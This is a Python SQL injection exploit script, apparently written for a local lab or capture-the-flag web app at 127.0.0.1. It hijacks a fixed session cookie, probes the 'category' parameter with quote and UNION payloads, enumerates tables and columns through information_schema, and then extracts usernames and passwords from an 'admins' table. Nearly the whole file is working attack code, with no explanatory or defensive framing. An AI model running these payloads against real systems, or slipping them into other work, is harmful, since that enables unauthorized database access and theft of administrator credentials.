import requests
import urllib.parse

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] Analyzing SQL Injection Behavior")
print(f"[+] Target: {target}")

# Test normal response
r_normal = session.get(target + "?category=Nature")
print(f"\n[+] Normal response size: {len(r_normal.text)} bytes")
print(f"[+] Snippet: {r_normal.text[:200]}")

# Test error response from quote
r_error = session.get(target + "?category='")
print(f"\n[+] Error response size: {len(r_error.text)} bytes")
print(f"[+] Full error response:\n{r_error.text}")

# Test what appears in response - search for error indicators
if "error" in r_error.text.lower():
    print("\n[!] Error message detected in response")
    
# Test UNION with different syntaxes
print("\n[+] Testing UNION variations:")
union_tests = [
    ("UNION no comment", "Nature' UNION SELECT 1,2,3,4,5"),
    ("UNION with #", "Nature' UNION SELECT 1,2,3,4,5#"),
    ("UNION subquery", "Nature' UNION SELECT 1,2,3,4,5 FROM dual"),
    ("UNION string concat", "Nature' UNION SELECT 'a','b','c','d','e"),
]

for name, payload in union_tests:
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    print(f"\n[+] {name}: {payload}")
    print(f"[+] Size: {len(r.text)} bytes")
    if len(r.text) != len(r_normal.text):
        print(f"[!] Different response!\n{r.text[:500]}")

# Try direct extraction with UNION (no comments)
print("\n[+] Attempting direct data extraction with UNION:")
extraction_payloads = [
    "Nature' UNION SELECT 1,2,3,4,5",
    "Nature' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()",
    "Nature' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='admins'",
    "Nature' UNION SELECT username,password,3,4,5 FROM admins LIMIT 1",
]

for payload in extraction_payloads:
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    print(f"\n[+] Payload: {payload[:60]}")
    print(f"[+] Size: {len(r.text)} bytes (normal: {len(r_normal.text)})")
    
    # Look for data in response
    response_text = r.text
    if "Nature" not in response_text and len(response_text) > len(r_normal.text) - 500:
        print(f"[!] May contain extracted data!\n{response_text}")

print("\n[+] Analysis complete")
